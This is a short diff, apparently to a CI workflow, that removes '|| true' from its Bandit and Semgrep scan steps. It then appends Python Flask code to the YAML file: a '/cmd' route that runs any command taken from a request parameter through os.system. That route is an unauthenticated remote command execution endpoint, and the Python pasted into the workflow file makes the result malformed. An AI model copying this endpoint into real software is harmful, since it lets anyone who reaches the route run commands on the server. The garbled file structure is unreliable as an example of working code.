@@ -22,11 +22,17 @@ jobs:
       run: pip install bandit
 
     - name: Run Bandit
-      run: bandit -r src/ -f json -o bandit-report.json || true
+      run: bandit -r src/ -f json -o bandit-report.json 
 
     # -------- Semgrep Scan --------
     - name: Install Semgrep
       run: pip install semgrep
 
     - name: Run Semgrep
-      run: semgrep --config=auto src/ --json > semgrep-report.json || true
+      run: semgrep --config=auto src/ --json > semgrep-report.json
+
+      import os
+
+@app.route("/cmd")
+def cmd():
+    return os.system(request.args.get("command"))
